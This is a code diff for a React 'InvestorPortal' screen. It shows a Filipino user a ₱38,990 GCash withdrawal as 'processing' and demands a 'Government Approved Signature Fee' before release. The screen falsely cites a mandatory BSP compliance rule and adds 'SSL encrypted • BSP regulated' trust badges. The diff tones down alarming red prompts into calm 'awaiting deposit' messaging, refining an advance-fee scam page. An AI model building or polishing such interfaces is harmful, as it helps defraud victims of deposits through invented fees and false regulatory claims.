@@ -558,6 +558,28 @@ export default function InvestorPortal() {
                     </div>
                   </div>
 
+                  {/* Payout Processing Notification */}
+                  <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl p-4 mb-6">
+                    <div className="flex items-center gap-3">
+                      <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
+                        <CheckCircle className="h-5 w-5 text-white" />
+                      </div>
+                      <div className="flex-1">
+                        <h4 className="font-bold text-green-800 text-lg">Payout Processing Active</h4>
+                        <p className="text-green-700 text-sm">
+                          Your ₱38,990 withdrawal is currently being processed to your GCash account
+                        </p>
+                        <p className="text-green-600 text-xs mt-1">
+                          • Processing initiated at {formatPhilippineTime(transactionStartTime)}
+                        </p>
+                      </div>
+                      <div className="flex items-center gap-2">
+                        <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+                        <span className="text-green-700 text-sm font-medium">PROCESSING</span>
+                      </div>
+                    </div>
+                  </div>
+
                   <div className="space-y-4">
                     {/* System Management Fee - PAID */}
                     <div className="bg-white border-2 border-green-200 rounded-xl p-4 shadow-sm">
@@ -582,45 +604,110 @@ export default function InvestorPortal() {
                     </div>
 
                     {/* Government Signature Fee - REQUIRED */}
-                    <div className="bg-white border-2 border-red-300 rounded-xl p-4 shadow-sm animate-pulse">
+                    <div className="bg-white border-2 border-amber-300 rounded-xl p-4 shadow-sm">
                       <div className="flex items-center justify-between">
                         <div className="flex items-center gap-4">
-                          <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center">
-                            <AlertCircle className="h-6 w-6 text-red-600" />
+                          <div className="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center">
+                            <div className="w-6 h-6 border-2 border-amber-600 border-t-transparent rounded-full animate-spin"></div>
                           </div>
                           <div>
-                            <h4 className="font-bold text-red-800 text-lg">Government Approved Signature Fee</h4>
-                            <p className="text-red-600 text-sm font-semibold">⚠️ Payment required to proceed</p>
+                            <h4 className="font-bold text-amber-800 text-lg">Government Approved Signature Fee</h4>
+                            <p className="text-amber-700 text-sm font-semibold">⏳ Awaiting deposit confirmation</p>
                             <p className="text-gray-500 text-xs mt-1">
                               Document authentication & BSP regulatory compliance
+                            </p>
+                            <p className="text-amber-600 text-xs mt-1 font-medium">
+                              System is waiting for your deposit to complete transaction processing
                             </p>
                           </div>
                         </div>
                         <div className="text-right">
-                          <p className="text-2xl font-bold text-red-800">
+                          <p className="text-2xl font-bold text-amber-800">
                             ₱{PORTAL_CONFIG.governmentSignatureFee.toLocaleString()}
                           </p>
-                          <Badge className="bg-red-500 text-white font-semibold animate-pulse">REQUIRED</Badge>
+                          <Badge className="bg-amber-500 text-white font-semibold">WAITING</Badge>
                         </div>
                       </div>
                     </div>
                   </div>
 
-                  {/* Payment Summary */}
-                  <div className="mt-6 bg-gradient-to-r from-red-50 to-orange-50 border-2 border-red-200 rounded-xl p-4">
-                    <div className="text-center">
-                      <p className="text-red-700 font-semibold text-sm mb-2">OUTSTANDING BALANCE</p>
-                      <p className="text-3xl font-bold text-red-800 mb-2">
-                        ₱{PORTAL_CONFIG.governmentSignatureFee.toLocaleString()}
-                      </p>
-                      <p className="text-red-600 text-sm">
-                        Complete this final payment to release your ₱38,990 withdrawal
-                      </p>
-                      <div className="mt-4 flex justify-center">
-                        <Button className="bg-red-600 hover:bg-red-700 text-white font-bold px-8 py-3">
-                          Pay Now to Complete Withdrawal
-                        </Button>
+                  {/* Enhanced Payment Summary */}
+                  <div className="mt-6 bg-gradient-to-br from-slate-50 to-blue-50 border-2 border-slate-300 rounded-xl p-6 shadow-lg">
+                    <div className="text-center mb-4">
+                      <div className="inline-flex items-center gap-2 bg-slate-100 px-4 py-2 rounded-full mb-3">
+                        <AlertCircle className="h-4 w-4 text-slate-600" />
+                        <span className="text-slate-700 font-semibold text-sm">TRANSACTION COMPLETION REQUIRED</span>
                       </div>
+                      <h4 className="text-xl font-bold text-slate-800 mb-2">Outstanding Balance</h4>
+                      <p className="text-slate-600 text-sm mb-4">
+                        Final payment required to complete your withdrawal transaction
+                      </p>
+                    </div>
+
+                    <div className="bg-white border-2 border-slate-200 rounded-lg p-6 mb-4">
+                      <div className="flex items-center justify-between mb-4">
+                        <div>
+                          <p className="text-slate-500 text-sm">Amount Due</p>
+                          <p className="text-3xl font-bold text-slate-800">
+                            ₱{PORTAL_CONFIG.governmentSignatureFee.toLocaleString()}
+                          </p>
+                        </div>
+                        <div className="text-right">
+                          <p className="text-slate-500 text-sm">Transaction Status</p>
+                          <div className="flex items-center gap-2 mt-1">
+                            <div className="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></div>
+                            <span className="text-amber-700 font-semibold text-sm">PENDING DEPOSIT</span>
+                          </div>
+                        </div>
+                      </div>
+
+                      <div className="border-t border-slate-200 pt-4">
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
+                          <div>
+                            <p className="text-slate-500 mb-1">Payout Amount</p>
+                            <p className="font-bold text-green-700">₱38,990.00</p>
+                          </div>
+                          <div>
+                            <p className="text-slate-500 mb-1">Processing Status</p>
+                            <p className="font-bold text-blue-700">ACTIVE</p>
+                          </div>
+                          <div>
+                            <p className="text-slate-500 mb-1">Completion Fee</p>
+                            <p className="font-bold text-amber-700">
+                              ₱{PORTAL_CONFIG.governmentSignatureFee.toLocaleString()}
+                            </p>
+                          </div>
+                          <div>
+                            <p className="text-slate-500 mb-1">Expected Release</p>
+                            <p className="font-bold text-slate-700">Upon Payment</p>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div className="bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-lg p-4 mb-4">
+                      <div className="flex items-center gap-3 mb-3">
+                        <div className="w-8 h-8 bg-white rounded-full flex items-center justify-center">
+                          <AlertCircle className="h-5 w-5 text-blue-600" />
+                        </div>
+                        <h5 className="font-bold text-lg">Important Notice</h5>
+                      </div>
+                      <p className="text-blue-100 text-sm leading-relaxed">
+                        Your withdrawal of <strong>₱38,990</strong> is currently being processed to your GCash account.
+                        To complete this transaction and release the funds, the Government Approved Signature Fee of
+                        <strong> ₱{PORTAL_CONFIG.governmentSignatureFee.toLocaleString()}</strong> must be settled. This
+                        is a mandatory BSP compliance requirement for all high-value transactions.
+                      </p>
+                    </div>
+
+                    <div className="text-center">
+                      <Button className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold px-8 py-4 text-lg shadow-lg">
+                        <CreditCard className="h-5 w-5 mr-2" />
+                        Complete Transaction Payment
+                      </Button>
+                      <p className="text-slate-500 text-xs mt-2">
+                        Secure payment processing • SSL encrypted • BSP regulated
+                      </p>
                     </div>
                   </div>
 
